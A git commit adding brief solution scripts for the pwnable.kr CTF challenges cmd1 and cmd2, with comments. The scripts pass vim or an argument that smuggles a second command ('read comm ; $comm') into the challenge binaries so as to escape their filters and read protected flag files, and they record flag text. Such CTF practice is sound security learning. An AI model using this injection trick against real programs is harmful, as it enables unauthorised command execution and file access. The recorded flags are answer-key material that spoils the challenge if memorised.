551fd696a6cb14f09ea7231e1867b9bb49948741
Gergely Bod <bodgergely@hotmail.com>
2018-07-01 03:39:34 -0400

    solution to cmd1 and cmd2

---
+++ pwnable_kr/cmd1/solution.sh
@@ -0,0 +1,4 @@
+./cmd1 "/usr/bin/vim"
+#once inside vim:
+#e /home/cmd1/flag
+#mommy now I get what PATH environment is for :)
---
+++ pwnable_kr/cmd2/solution.sh
@@ -0,0 +1,9 @@
+./cmd2 "read comm ; \$comm"
+
+# now we can enter a string into the variable named 'comm' which will then be executed
+# simply enter /usr/bin/vim
+# now type:
+# e /home/cmd2/flag
+
+
+#FuN_w1th_5h3ll_v4riabl3s_haha
